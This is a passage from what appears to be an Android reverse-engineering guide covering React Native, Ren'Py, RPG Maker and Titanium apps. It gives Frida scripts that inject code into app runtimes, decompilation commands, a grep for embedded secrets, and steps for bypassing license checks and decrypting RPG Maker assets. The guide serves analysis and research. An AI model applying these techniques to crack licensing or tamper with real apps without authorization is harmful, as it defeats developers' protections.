 CatalystInstance.loadScriptFromAssets.implementation = function(assetManager, assetURL, loadSynchronously) {\n        console.log(\"[RN] Loading bundle: \" + assetURL);\n        this.loadScriptFromAssets(assetManager, assetURL, loadSynchronously);\n        this.loadScriptFromFile(\"/data/local/tmp/inject.js\", \"inject.js\", false);\n    };\n});\n</code></pre> <p>This loads a custom script file into the same JS context after the main bundle, giving full access to the app's JavaScript environment.</p>"},{"location":"reversing/frameworks/react-native/#hermes-native-hooking","title":"Hermes Native Hooking","text":"<p>For Hermes-specific instrumentation, hook the Hermes runtime directly:</p> <pre><code>var hermesModule = Process.findModuleByName(\"libhermes.so\");\nif (hermesModule) {\n    var exports = hermesModule.enumerateExports();\n    exports.forEach(function(exp) {\n        if (exp.name.indexOf(\"nativeCallSyncHook\") !== -1) {\n            Interceptor.attach(exp.address, {\n                onEnter: function(args) {\n                    console.log(\"[Hermes] nativeCallSyncHook called\");\n                },\n                onLeave: function(retval) {}\n            });\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/react-native/#turbomodule-hooking-new-architecture","title":"TurboModule Hooking (New Architecture)","text":"<p>For apps using the New Architecture, TurboModules are accessed through JSI rather than the bridge. Hook the C++ binding layer:</p> <pre><code>var jsiModule = Process.findModuleByName(\"libjsi.so\");\nif (jsiModule) {\n    jsiModule.enumerateExports().forEach(function(exp) {\n        if (exp.name.indexOf(\"call\") !== -1 &amp;&amp; exp.type === \"function\") {\n            console.log(\"[JSI] \" + exp.name + \" @ \" + exp.address);\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/react-native/#obfuscation-anti-analysis","title":"Obfuscation &amp; Anti-Analysis","text":""},{"location":"reversing/frameworks/react-native/#hermes-bytecode-default-protection","title":"Hermes Bytecode (Default Protection)","text":"<p>The move to Hermes provides baseline obfuscation. The bundle is no longer plaintext JS but compiled bytecode. This defeats casual <code>grep</code>/<code>strings</code> analysis of the full logic, though string literals remain extractable.</p>"},{"location":"reversing/frameworks/react-native/#jscrambler","title":"Jscrambler","text":"<p>Jscrambler is the most common commercial obfuscation layer for React Native. It integrates as a Metro bundler plugin and transforms the JavaScript before Hermes compilation.</p> <p>Jscrambler transformations include:</p> Transformation Effect Control flow flattening Replaces structured code with switch-based dispatch String encoding Encodes string literals, decodes at runtime via helper functions Dead code injection Adds unreachable code paths to inflate analysis surface Self-defending Crashes or loops if the code is reformatted/beautified Domain lock Binds execution to specific bundle hashes or environments Anti-tampering Detects modifications to the bundle and terminates <p>When Jscrambler is applied before Hermes compilation, the obfuscation is baked into the bytecode. Decompiling with hermes-dec produces the obfuscated logic, not the original source.</p>"},{"location":"reversing/frameworks/react-native/#metro-bundler-plugins","title":"Metro Bundler Plugins","text":"<p>Open-source alternatives to Jscrambler use the Metro bundler's transform pipeline:</p> <ul> <li>obfuscator-io-metro-plugin -- wraps javascript-obfuscator as a Metro transformer</li> <li><code>react-native-obfuscating-transformer</code> -- basic identifier mangling</li> </ul> <p>These produce weaker obfuscation than Jscrambler but still complicate static analysis.</p>"},{"location":"reversing/frameworks/react-native/#proguard-r8","title":"ProGuard / R8","text":"<p>The Java/Kotlin shell code runs through R8/ProGuard during release builds, minifying class and method names in the DEX layer. This affects the native module names but not the JS bundle content.</p>"},{"location":"reversing/frameworks/react-native/#malware-context","title":"Malware Context","text":"<p>React Native is used in malware campaigns that prioritize rapid cross-platform development over deep Android API access. The framework appeals to threat actors who need to quickly clone legitimate app UIs for phishing.</p> Use Case Details Fake banking apps Clone legitimate banking interfaces using React Native's component system, harvest credentials via fake login forms Phishing campaigns Rapid deployment of convincing app replicas across Android and iOS from a single codebase SpyLoan predatory lending Some SpyLoan-category apps use web frameworks (Cordova, React Native) for fast iteration on phishing UIs Credential harvesters Simple apps that display a WebView or RN form, POST stolen data to a C2 endpoint <p>React Native malware is typically unsophisticated compared to native banking trojans. The apps lack accessibility abuse, overlay injection, or ATS capabilities found in families like Cerberus or GodFather. Their value to threat actors is speed of development and cross-platform reach, not evasion depth.</p> <p>ESET Classification</p> <p>ESET's research on Android banking malware distinguishes between \"sophisticated trojans\" (native, multi-stage, ATS-equipped) and \"fake banking apps\" (simple credential stealers). React Native malware falls squarely in the latter category, relying on social engineering rather than technical exploitation.</p>"},{"location":"reversing/frameworks/react-native/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect JSC Engine Hermes Engine Code format Plaintext JavaScript Hermes bytecode (HBC) Readability High -- minified but beautifiable Low -- requires decompilation String extraction Trivial Trivial (strings in HBC string table) Control flow recovery Full Partial (hermes-dec uses labels/jumps) Patching Edit JS directly Disassemble, patch, reassemble with hbctool Obfuscation ceiling Jscrambler, javascript-obfuscator Same tools applied pre-compilation Overall difficulty Easy (rank 13/28) Moderate (rank 16/28) <p>The Java/Kotlin shell is a thin wrapper with minimal logic -- focus analysis on the JS bundle. For Hermes apps, the main bottleneck is decompiler maturity: hermes-dec produces readable output for straightforward code but struggles with complex control flow and heavily obfuscated bundles. Cross-reference decompiled output with runtime Frida hooks to fill gaps.</p>"},{"location":"reversing/frameworks/react-native/#references","title":"References","text":"<ul> <li>hermes-dec -- P1 Security</li> <li>hbctool -- bongtrop</li> <li>hermes_rs -- Pilfer</li> <li>Hermes Design Documentation</li> <li>Hooking React Native Applications with Frida -- BeDefended</li> <li>Reverse Engineering and Instrumenting React Native Apps -- Pilfer</li> <li>Understanding and Modifying the Hermes Bytecode -- Payatu</li> <li>P1 Security hermes-dec release blog</li> <li>OWASP MASTG: hermes-dec</li> <li>React Native New Architecture</li> </ul>"},{"location":"reversing/frameworks/renpy/","title":"Ren'Py","text":"<p>Ren'Py is an open-source visual novel engine built on Python and Pygame/SDL2. On Android, Ren'Py apps ship a full CPython interpreter (<code>libpython*.so</code>) alongside compiled Ren'Py scripts (<code>.rpyc</code> files) and Python bytecode (<code>.pyc</code> files) inside the APK's <code>assets/</code> directory. The engine's scripting language compiles to Python bytecode at build time, but the compilation is reversible -- making Ren'Py one of the most straightforward frameworks to reverse engineer on Android.</p>"},{"location":"reversing/frameworks/renpy/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/renpy/#engine-stack","title":"Engine Stack","text":"Layer Component Role Scripting Ren'Py Script Language (<code>.rpy</code>) High-level DSL for dialogue, choices, transitions, game flow Compilation <code>.rpy</code> to <code>.rpyc</code> Ren'Py compiles scripts to pickled Python AST representations Runtime CPython (<code>libpython*.so</code>) Full Python interpreter embedded in the APK Rendering Pygame/SDL2 (<code>libSDL2.so</code>) 2D rendering, audio playback, input handling Platform <code>librenpy.so</code> Ren'Py native acceleration module Android Shell <code>org.renpy.android</code> Java bootstrap that initializes Python and launches the engine"},{"location":"reversing/frameworks/renpy/#build-process","title":"Build Process","text":"<p>Ren'Py uses RAPT (Ren'Py Android Packaging Tool) to package games for Android. The tool bundles the Python runtime, engine libraries, and compiled game scripts into an APK. The process compiles <code>.rpy</code> source scripts into <code>.rpyc</code> files -- serialized Python objects containing the game's abstract syntax tree (AST) -- and packages them under <code>assets/game/</code>.</p>"},{"location":"reversing/frameworks/renpy/#script-compilation-format","title":"Script Compilation Format","text":"<p><code>.rpyc</code> files are not Python bytecode. They are pickled Python objects representing the Ren'Py AST. Each <code>.rpyc</code> file contains:</p> <ul> <li>A two-byte header slot (format identifier)</li> <li>Zlib-compressed pickled data</li> <li>Ren'Py AST nodes representing dialogue, menus, jumps, conditionals, and Python blocks</li> </ul> <p>This distinction matters: standard Python decompilers (<code>uncompyle6</code>, <code>decompyle3</code>) do not work on <code>.rpyc</code> files. A dedicated tool (<code>unrpyc</code>) is required.</p>"},{"location":"reversing/frameworks/renpy/#identification","title":"Identification","text":"Indicator Location <code>assets/renpy/</code> Core Ren'Py engine scripts <code>assets/game/*.rpyc</code> Compiled game scripts <code>assets/game/*.rpa</code> Ren'Py archive files (images, audio, fonts) <code>libpython*.so</code> Embedded CPython interpreter (e.g., <code>libpython2.7.so</code>, <code>libpython3.9.so</code>) <code>librenpy.so</code> Ren'Py native acceleration module <code>libSDL2.so</code> SDL2 rendering backend <code>org.renpy.android</code> Java package prefix in DEX classes <code>org.renpy.android.PythonSDLActivity</code> Main activity class <p>Quick check:</p> <pre><code>unzip -l target.apk | grep -E \"(renpy/|\\.rpyc|libpython|librenpy)\"\n</code></pre>"},{"location":"reversing/frameworks/renpy/#code-location","title":"Code Location","text":""},{"location":"reversing/frameworks/renpy/#primary-targets","title":"Primary Targets","text":"Path Content Format <code>assets/game/*.rpyc</code> Compiled game scripts Pickled Ren'Py AST (zlib-compressed) <code>assets/game/*.rpa</code> Asset archives Ren'Py archive format (images, audio, video) <code>assets/renpy/**/*.pyo</code> Engine bytecode Python compiled bytecode <code>assets/game/bytecode.rpyb</code> Additional compiled bytecode Ren'Py bytecode bundle <code>assets/game/script_version.txt</code> Engine version identifier Plaintext"},{"location":"reversing/frameworks/renpy/#python-bytecode","title":"Python Bytecode","text":"<p>Ren'Py bundles Python <code>.pyo</code>/<code>.pyc</code> files for both the engine internals (<code>assets/renpy/</code>) and any custom Python modules the developer includes. These are standard CPython bytecode and can be decompiled with Python bytecode decompilers.</p>"},{"location":"reversing/frameworks/renpy/#extraction-decompilation","title":"Extraction &amp; Decompilation","text":""},{"location":"reversing/frameworks/renpy/#rpyc-decompilation-with-unrpyc","title":".rpyc Decompilation with unrpyc","text":"<p>unrpyc is the standard tool for decompiling <code>.rpyc</code> files back to readable <code>.rpy</code> source:</p> <pre><code>unzip target.apk \"assets/game/*.rpyc\" -d extracted/\ngit clone https://github.com/CensoredUsername/unrpyc.git\npython unrpyc/unrpyc.py extracted/assets/game/*.rpyc\n</code></pre> <p>unrpyc unpickles the AST and reconstructs the original Ren'Py script syntax. The output is near-identical to the original <code>.rpy</code> source, including dialogue text, menu choices, character definitions, conditional branches, and embedded Python blocks.</p> <p>For batch processing:</p> <pre><code>find extracted/assets/game/ -name \"*.rpyc\" -exec python unrpyc/unrpyc.py {} \\;\n</code></pre>"},{"location":"reversing/frameworks/renpy/#rpa-archive-extraction","title":".rpa Archive Extraction","text":"<p>Ren'Py archive files (<code>.rpa</code>) bundle game assets. rpatool extracts them:</p> <pre><code>pip install rpatool\nrpatool -x extracted/assets/game/archive.rpa -o output_dir/\n</code></pre> <p>Alternatively, unrpa:</p> <pre><code>pip install unrpa\nunrpa -mp output_dir/ extracted/assets/game/archive.rpa\n</code></pre>"},{"location":"reversing/frameworks/renpy/#python-bytecode-decompilation","title":"Python Bytecode Decompilation","text":"<p>For <code>.pyo</code>/<code>.pyc</code> files in <code>assets/renpy/</code> and custom modules:</p> uncompyle6 (Python 2.x)decompyle3 (Python 3.x)pycdc (Cross-version) <pre><code>pip install uncompyle6\nuncompyle6 extracted/assets/renpy/ast.pyo &gt; ast.py\n</code></pre> <pre><code>pip install decompyle3\ndecompyle3 extracted/assets/renpy/ast.pyc &gt; ast.py\n</code></pre> <pre><code>git clone https://github.com/zrax/pycdc.git\ncd pycdc &amp;&amp; cmake . &amp;&amp; make\n./pycdc extracted/assets/renpy/ast.pyc &gt; ast.py\n</code></pre> <p>pycdc handles a wider range of Python bytecode versions than uncompyle6 or decompyle3.</p>"},{"location":"reversing/frameworks/renpy/#analysis-workflow","title":"Analysis Workflow","text":""},{"location":"reversing/frameworks/renpy/#recommended-workflow","title":"Recommended Workflow","text":"<ol> <li>Unzip APK and confirm Ren'Py indicators (<code>assets/renpy/</code>, <code>.rpyc</code> files, <code>libpython*.so</code>)</li> <li>Extract .rpyc files from <code>assets/game/</code></li> <li>Decompile with unrpyc to recover full Ren'Py scripts</li> <li>Extract .rpa archives for asset analysis</li> <li>Search decompiled scripts for network calls, <code>renpy.python</code> blocks, file operations</li> <li>Decompile Python bytecode in <code>assets/renpy/</code> for engine-level analysis</li> <li>Hook at runtime with Frida for dynamic inspection</li> </ol>"},{"location":"reversing/frameworks/renpy/#key-analysis-targets-in-decompiled-scripts","title":"Key Analysis Targets in Decompiled Scripts","text":"Pattern Significance <code>python:</code> blocks Embedded Python code -- may contain network calls, crypto, file I/O <code>$ persistent.*</code> Persistent game state -- save data, unlock flags, purchase records <code>renpy.call_in_new_context()</code> Dynamic code execution <code>im.matrix</code> / <code>transform</code> Asset manipulation (may hide content) <code>config.keymap</code> Custom input handling URLs and endpoints Network communication, analytics, license checks"},{"location":"reversing/frameworks/renpy/#hooking-strategy","title":"Hooking Strategy","text":""},{"location":"reversing/frameworks/renpy/#python-runtime-hooking","title":"Python Runtime Hooking","text":"<p>Since Ren'Py ships a full CPython interpreter, hook the Python C API through <code>libpython*.so</code>:</p> <pre><code>var pythonModule = Process.findModuleByName(\"libpython3.9.so\");\nif (pythonModule) {\n    var PyRun = Module.findExportByName(pythonModule.name, \"PyRun_SimpleString\");\n    if (PyRun) {\n        Interceptor.attach(PyRun, {\n            onEnter: function(args) {\n                console.log(\"[Python] PyRun_SimpleString: \" + args[0].readUtf8String());\n            }\n        });\n    }\n}\n</code></pre>"},{"location":"reversing/frameworks/renpy/#injecting-python-code","title":"Injecting Python Code","text":"<p>Execute arbitrary Python inside the Ren'Py runtime:</p> <pre><code>var pythonModule = Process.findModuleByName(\"libpython3.9.so\");\nif (pythonModule) {\n    var PyRun = new NativeFunction(\n        Module.findExportByName(pythonModule.name, \"PyRun_SimpleString\"),\n        \"int\",\n        [\"pointer\"]\n    );\n    var payload = Memory.allocUtf8String(\"import renpy; print(renpy.config.__dict__)\");\n    PyRun(payload);\n}\n</code></pre>"},{"location":"reversing/frameworks/renpy/#sdl2-event-interception","title":"SDL2 Event Interception","text":"<p>Hook SDL2 for input monitoring:</p> <pre><code>var sdlModule = Process.findModuleByName(\"libSDL2.so\");\nif (sdlModule) {\n    var SDL_PollEvent = Module.findExportByName(sdlModule.name, \"SDL_PollEvent\");\n    Interceptor.attach(SDL_PollEvent, {\n        onLeave: function(retval) {\n            if (retval.toInt32() === 1) {\n                console.log(\"[SDL2] Event polled\");\n            }\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/renpy/#script-modification-patching","title":"Script Modification &amp; Patching","text":""},{"location":"reversing/frameworks/renpy/#direct-script-replacement","title":"Direct Script Replacement","text":"<p>Ren'Py's compilation is fully reversible. The patching workflow:</p> <ol> <li>Extract and decompile <code>.rpyc</code> to <code>.rpy</code> with unrpyc</li> <li>Modify the <code>.rpy</code> source</li> <li>Recompile to <code>.rpyc</code> using Ren'Py SDK (or simply include the <code>.rpy</code> -- Ren'Py loads <code>.rpy</code> over <code>.rpyc</code> if both exist)</li> <li>Repackage APK, re-sign, install</li> </ol>"},{"location":"reversing/frameworks/renpy/#force-loading-modified-scripts","title":"Force-Loading Modified Scripts","text":"<p>Ren'Py prioritizes <code>.rpy</code> files over <code>.rpyc</code> when both exist in the same directory. Placing a modified <code>.rpy</code> alongside its <code>.rpyc</code> counterpart forces the engine to use the plaintext version without recompilation.</p>"},{"location":"reversing/frameworks/renpy/#obfuscation-protection","title":"Obfuscation &amp; Protection","text":""},{"location":"reversing/frameworks/renpy/#common-protections","title":"Common Protections","text":"Technique Description Bypass <code>.rpa</code> archives with custom keys Modified archive format with non-standard index offsets Analyze <code>renpy/loader.py</code> for key extraction Bytecode-only distribution Shipping <code>.rpyc</code> without <code>.rpy</code> source unrpyc decompiles fully Python version mismatch Using unusual Python versions to break decompilers Use pycdc or match the specific Python version Custom pickle classes Modified AST classes that break unrpyc Patch unrpyc to handle custom classes <p>Some Ren'Py games implement license checks in Python blocks within game scripts. These are trivially located and bypassed after decompilation with unrpyc.</p>"},{"location":"reversing/frameworks/renpy/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Rating Code format Pickled AST (fully decompilable) Readability after decompilation High -- near-original source recovery String extraction Trivial (dialogue text in AST) Control flow recovery Full Patching Trivial -- replace scripts or add <code>.rpy</code> overrides Obfuscation ceiling Low -- Python-based, limited protection options Overall difficulty Easy <p>Ren'Py games are among the easiest Android applications to reverse engineer. The combination of a fully decompilable script format, a standard Python interpreter, and a well-maintained decompilation toolchain (unrpyc) means that near-complete source recovery is the norm. Analysis effort focuses on reading the decompiled game logic rather than fighting obfuscation.</p>"},{"location":"reversing/frameworks/renpy/#references","title":"References","text":"<ul> <li>unrpyc -- CensoredUsername</li> <li>rpatool -- Shizmob</li> <li>unrpa -- Lattyware</li> <li>pycdc -- Decompyle++</li> <li>RAPT -- Ren'Py Android Packaging Tool</li> <li>Ren'Py Engine Source</li> <li>Ren'Py Documentation</li> </ul>"},{"location":"reversing/frameworks/rpgmaker/","title":"RPG Maker MV/MZ","text":"<p>RPG Maker MV and MZ produce HTML5 games using Pixi.js for rendering and a JavaScript-based engine for game logic. On Android, these games are wrapped in Apache Cordova (or a similar WebView shell), placing all game code and assets under <code>assets/www/</code> as plaintext JavaScript. The entire engine, plugin system, and game data ship uncompiled -- making RPG Maker one of the most transparent frameworks to reverse engineer on Android.</p>"},{"location":"reversing/frameworks/rpgmaker/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/rpgmaker/#engine-variants","title":"Engine Variants","text":"Version Rendering Runtime Android Wrapper Release RPG Maker MV Pixi.js v4 Custom JS engine Cordova (Crosswalk WebView on older builds) 2015 RPG Maker MZ Pixi.js v5 (PIXI.js updated) Refactored JS engine with effekseer support Cordova 2020 <p>Both versions share the same fundamental architecture on Android:</p> Layer Component Role Game Logic <code>rpg_managers.js</code>, <code>rpg_objects.js</code>, <code>rpg_scenes.js</code> Core game systems (save/load, battle, map, events) Engine Core <code>rpg_core.js</code> Base classes, bitmap handling, input, rendering setup Rendering <code>pixi.js</code> / <code>pixi.min.js</code> 2D WebGL/Canvas rendering via Pixi.js Plugins <code>js/plugins/*.js</code> Developer and third-party extensions Data <code>data/*.json</code> Maps, events, actors, items, skills, enemies, tilesets Android Shell Cordova WebView <code>android.webkit.WebView</code> hosting the HTML5 game"},{"location":"reversing/frameworks/rpgmaker/#execution-flow","title":"Execution Flow","text":"<p>The Android app loads <code>assets/www/index.html</code> in a Cordova WebView. This HTML file loads <code>pixi.js</code>, the RPG Maker core scripts, plugins, and then boots the game. All execution happens within the WebView's JavaScript engine -- there are no native components beyond the Cordova shell.</p>"},{"location":"reversing/frameworks/rpgmaker/#identification","title":"Identification","text":"Indicator Location <code>assets/www/js/rpg_core.js</code> RPG Maker engine core <code>assets/www/js/rpg_managers.js</code> Game manager classes (SaveManager, BattleManager, etc.) <code>assets/www/js/rpg_objects.js</code> Game object definitions (Game_Actor, Game_Map, etc.) <code>assets/www/js/rpg_scenes.js</code> Scene management (Scene_Title, Scene_Battle, etc.) <code>assets/www/js/rpg_sprites.js</code> Sprite rendering classes <code>assets/www/js/rpg_windows.js</code> UI window classes <code>assets/www/js/plugins.js</code> Plugin loader configuration <code>assets/www/js/plugins/</code> Plugin directory <code>assets/www/data/*.json</code> Game data files (JSON) <code>assets/www/index.html</code> Entry point HTML <code>assets/www/js/pixi.js</code> or <code>assets/www/js/libs/pixi.js</code> Pixi.js rendering library <p>Quick check:</p> <pre><code>unzip -l target.apk | grep -E \"(rpg_core|rpg_managers|rpg_objects|rpg_scenes)\"\n</code></pre>"},{"location":"reversing/frameworks/rpgmaker/#mv-vs-mz-differentiation","title":"MV vs MZ Differentiation","text":"Feature MV MZ <code>rpg_core.js</code> header <code>Utils.RPGMAKER_NAME = \"MV\"</code> <code>Utils.RPGMAKER_NAME = \"MZ\"</code> Pixi version v4.x v5.x <code>js/libs/effekseer.min.js</code> Absent Present (particle effects) <code>rmmz_*.js</code> naming Not used Some builds use <code>rmmz_core.js</code>, <code>rmmz_managers.js</code>, etc."},{"location":"reversing/frameworks/rpgmaker/#code-location","title":"Code Location","text":"<p>All game logic is plaintext JavaScript in <code>assets/www/js/</code>:</p> File Content <code>rpg_core.js</code> Base engine classes: <code>Bitmap</code>, <code>Graphics</code>, <code>Input</code>, <code>TouchInput</code>, <code>Tilemap</code> <code>rpg_managers.js</code> <code>DataManager</code>, <code>BattleManager</code>, <code>AudioManager</code>, <code>SceneManager</code>, <code>PluginManager</code> <code>rpg_objects.js</code> <code>Game_System</code>, <code>Game_Map</code>, <code>Game_Player</code>, <code>Game_Actor</code>, <code>Game_Enemy</code>, <code>Game_Party</code> <code>rpg_scenes.js</code> <code>Scene_Boot</code>, <code>Scene_Title</code>, <code>Scene_Map</code>, <code>Scene_Battle</code>, <code>Scene_Menu</code>, <code>Scene_Shop</code> <code>rpg_sprites.js</code> <code>Sprite_Character</code>, <code>Sprite_Battler</code>, <code>Sprite_Animation</code> <code>rpg_windows.js</code> <code>Window_Base</code>, <code>Window_Message</code>, <code>Window_MenuCommand</code>, <code>Window_ShopBuy</code> <code>plugins.js</code> Plugin configuration array (load order, parameters) <code>plugins/*.js</code> Individual plugin files <p>Game data is stored as JSON in <code>assets/www/data/</code> -- <code>Map*.json</code> (map layouts, events), <code>Actors.json</code>, <code>Enemies.json</code>, <code>Items.json</code>, <code>Skills.json</code>, <code>Weapons.json</code>, <code>Armors.json</code>, <code>CommonEvents.json</code>, and <code>System.json</code> (game configuration, encryption key, starting party).</p>"},{"location":"reversing/frameworks/rpgmaker/#extraction-analysis","title":"Extraction &amp; Analysis","text":""},{"location":"reversing/frameworks/rpgmaker/#basic-extraction","title":"Basic Extraction","text":"<pre><code>unzip target.apk \"assets/www/*\" -d extracted/\n</code></pre> <p>The extracted <code>assets/www/</code> directory is a complete, functional web application. It can be opened directly in a desktop browser for analysis and debugging:</p> <pre><code>cd extracted/assets/www/\npython3 -m http.server 8080\n</code></pre>"},{"location":"reversing/frameworks/rpgmaker/#code-analysis","title":"Code Analysis","text":"<p>The JavaScript is typically unminified or lightly minified. RPG Maker ships its engine files in readable form:</p> <pre><code>npx prettier --write extracted/assets/www/js/*.js\ngrep -rn \"http\\|api\\|token\\|key\\|secret\\|password\\|eval\\|Function(\" extracted/assets/www/js/\n</code></pre> <p>Plugins in <code>assets/www/js/plugins/</code> are standalone JavaScript files and the primary location for custom developer logic. The <code>plugins.js</code> file lists all loaded plugins with their parameters and load order.</p>"},{"location":"reversing/frameworks/rpgmaker/#asset-encryption","title":"Asset Encryption","text":""},{"location":"reversing/frameworks/rpgmaker/#rpg-maker-mvmz-encryption-system","title":"RPG Maker MV/MZ Encryption System","text":"<p>RPG Maker MV and MZ include a built-in asset encryption feature that XOR-encrypts image (<code>.rpgmvp</code> / <code>.png_</code>) and audio (<code>.rpgmvo</code> / <code>.ogg_</code>) files. The encryption is weak by design:</p> <ul> <li>Uses a 16-byte encryption key stored in <code>System.json</code> as the <code>encryptionKey</code> field</li> <li>Only the first 16 bytes of each file are XORed with the key</li> <li>The rest of the file is unmodified</li> </ul> <p>Extraction of the key:</p> <pre><code>grep -o '\"encryptionKey\":\"[^\"]*\"' extracted/assets/www/data/System.json\n</code></pre>"},{"location":"reversing/frameworks/rpgmaker/#decryption","title":"Decryption","text":"<p>The decryption logic is in <code>rpg_core.js</code> under <code>Decrypter</code>:</p> <pre><code>grep -A 20 \"Decrypter\" extracted/assets/www/js/rpg_core.js\n</code></pre> <p>Dedicated decryption tools:</p> <ul> <li>Petschko's RPG Maker MV Decrypter and similar forks</li> <li>Manual decryption: read the 16-byte key from <code>System.json</code>, XOR the first 16 bytes of each encrypted file, restore original file headers</li> </ul> <p>The encryption provides no meaningful security. The key is plaintext in the APK, the algorithm is XOR on a 16-byte prefix, and the decryption routine ships in the game's own JavaScript.</p>"},{"location":"reversing/frameworks/rpgmaker/#hooking-strategy","title":"Hooking Strategy","text":""},{"location":"reversing/frameworks/rpgmaker/#webview-javascript-injection","title":"WebView JavaScript Injection","text":"<p>Since RPG Maker runs inside a Cordova WebView, inject JavaScript through the WebView interface:</p> <pre><code>Java.perform(function() {\n    var WebView = Java.use(\"android.webkit.WebView\");\n    WebView.loadUrl.overload(\"java.lang.String\").implementation = function(url) {\n        this.loadUrl(url);\n        this.evaluateJavascript(\n            \"console.log(JSON.stringify($dataSystem));\",\n            null\n        );\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/rpgmaker/#hooking-game-state","title":"Hooking Game State","text":"<p>RPG Maker stores all game state in global objects (<code>$gameVariables</code>, <code>$gameParty</code>, <code>$dataSystem</code>). Inject into the WebView to monitor or modify:</p> <pre><code>Java.perform(function() {\n    Java.choose(\"android.webkit.WebView\", {\n        onMatch: function(webview) {\n            webview.evaluateJavascript(\n                \"var _origSetValue = Game_Variables.prototype.setValue;\" +\n                \"Game_Variables.prototype.setValue = function(id, val) {\" +\n                \"  console.log('[RPG] Variable ' + id + ' = ' + val);\" +\n                \"  _origSetValue.call(this, id, val);\" +\n                \"};\" +\n                \"var _origSave = DataManager.saveGame;\" +\n                \"DataManager.saveGame = function(savefileId) {\" +\n                \"  console.log('[RPG] Save slot=' + savefileId + ' gold=' + $gameParty.gold());\" +\n                \"  return _origSave.call(this, savefileId);\" +\n                \"};\",\n                null\n            );\n        },\n        onComplete: function() {}\n    });\n});\n</code></pre>"},{"location":"reversing/frameworks/rpgmaker/#direct-js-modification","title":"Direct JS Modification","text":"<p>The simplest approach is modifying the JavaScript files directly:</p> <ol> <li>Extract <code>assets/www/js/</code> from APK</li> <li>Edit any <code>.js</code> file (engine, plugins, or add new files)</li> <li>Repackage APK with modified files</li> <li>Re-sign and install</li> </ol> <p>No compilation step is needed. The WebView executes whatever JavaScript is present.</p>"},{"location":"reversing/frameworks/rpgmaker/#plugin-system-obfuscation","title":"Plugin System &amp; Obfuscation","text":"<p>Plugins extend the engine by overriding prototype methods on core classes, and are the primary location for DRM, encryption, anti-cheat, in-app purchase, and analytics logic. Each plugin is a standalone JS file -- analyze <code>plugins.js</code> for the load manifest, then read each plugin directly.</p> Technique Description Bypass JavaScript minification Variable/function name mangling Beautify + analyze Plugin obfuscation javascript-obfuscator / Jscrambler on plugin JS Standard deobfuscation tools Custom encryption Additional encryption layer on data JSONs Key is in the JS -- trace <code>DataManager</code> Cordova plugin protection Native Cordova plugins for license checks Hook Java layer"},{"location":"reversing/frameworks/rpgmaker/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Rating Code format Plaintext JavaScript Readability High -- typically unminified engine code String extraction Trivial Control flow recovery Full (standard JS) Patching Trivial -- edit JS directly, no compilation Data modification Trivial -- JSON game data Asset encryption Weak -- XOR with plaintext key Overall difficulty Easy <p>RPG Maker MV/MZ games on Android are effectively open-source applications. The engine ships readable JavaScript, game data is JSON, asset encryption is a 16-byte XOR with the key in plaintext, and the entire application runs inside a WebView that accepts arbitrary JavaScript injection. Analysis effort is minimal -- the primary challenge is navigating the volume of game data and plugin code rather than defeating any protection mechanism.</p>"},{"location":"reversing/frameworks/rpgmaker/#references","title":"References","text":"<ul> <li>RPG Maker MV CoreScripts</li> <li>RPG Maker MZ CoreScripts</li> <li>Petschko's RPG Maker MV/MZ File Decrypter</li> <li>RPG Maker MV Plugin Documentation</li> <li>Pixi.js -- 2D Rendering Engine</li> <li>Apache Cordova</li> </ul>"},{"location":"reversing/frameworks/titanium/","title":"Titanium (Appcelerator)","text":"<p>Titanium apps run JavaScript on a V8 engine embedded in a native Android shell, with the Kroll bridge translating JS calls into native Android API invocations. All application logic resides as JavaScript files inside <code>assets/Resources/</code>, making them the primary reverse engineering target. Appcelerator Titanium was a popular cross-platform framework from roughly 2010--2018; its usage has declined sharply, but legacy apps and some malware samples still surface in the wild. The project was acquired by Axway and eventually discontinued, though the open-source SDK remains on GitHub.</p>"},{"location":"reversing/frameworks/titanium/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/titanium/#runtime-components","title":"Runtime Components","text":"Component Role V8 Engine Executes JavaScript application code on Android Kroll Bridge Bidirectional proxy layer connecting JS objects to native Java classes Titanium Modules Java classes exposing Android APIs (camera, contacts, filesystem) to JS Proxy Objects Java-side representations of JS objects, managed by Kroll's reference system <p>When a Titanium app calls <code>Ti.Network.createHTTPClient()</code>, the Kroll bridge maps the JS call to <code>org.appcelerator.titanium.TiHTTPClient</code> on the Java side. Every <code>Ti.*</code> namespace maps to a corresponding Java proxy class registered through Kroll's module system.</p>"},{"location":"reversing/frameworks/titanium/#execution-flow","title":"Execution Flow","text":"<ol> <li>Android activity launches via <code>org.appcelerator.titanium.TiApplication</code></li> <li>V8 engine initializes through <code>libkroll-v8.so</code></li> <li>Kroll loads and registers all Titanium module proxies</li> <li>V8 evaluates <code>app.js</code> from <code>assets/Resources/</code></li> <li>JS execution drives the app, with Kroll routing API calls to native Java classes</li> </ol>"},{"location":"reversing/frameworks/titanium/#native-libraries","title":"Native Libraries","text":"Library Purpose <code>libkroll-v8.so</code> V8 JavaScript engine with Kroll binding layer <code>libtitanium.so</code> Core Titanium runtime native code <code>libtiverify.so</code> License verification (present in some builds) <code>libstlport_shared.so</code> C++ standard library dependency"},{"location":"reversing/frameworks/titanium/#identification","title":"Identification","text":"Indicator Location <code>libkroll-v8.so</code> <code>lib/&lt;arch&gt;/</code> directory <code>libtitanium.so</code> <code>lib/&lt;arch&gt;/</code> directory <code>org.appcelerator.titanium.*</code> DEX class hierarchy <code>org.appcelerator.kroll.*</code> Kroll bridge classes in DEX <code>assets/Resources/</code> Directory containing JS source files <code>assets/Resources/app.js</code> Application entry point <code>tiapp.xml</code> Titanium project configuration (sometimes in assets) <p>Quick check:</p> <pre><code>unzip -l target.apk | grep -E \"(libkroll|libtitanium|Resources/app\\.js|tiapp\\.xml)\"\n</code></pre> <p>Manifest inspection:</p> <pre><code>aapt dump xmltree target.apk AndroidManifest.xml | grep -i appcelerator\n</code></pre>"},{"location":"reversing/frameworks/titanium/#code-location-extraction","title":"Code Location &amp; Extraction","text":""},{"location":"reversing/frameworks/titanium/#javascript-source-files","title":"JavaScript Source Files","text":"<p>Titanium stores application code as plaintext JavaScript files in <code>assets/Resources/</code>. Unlike 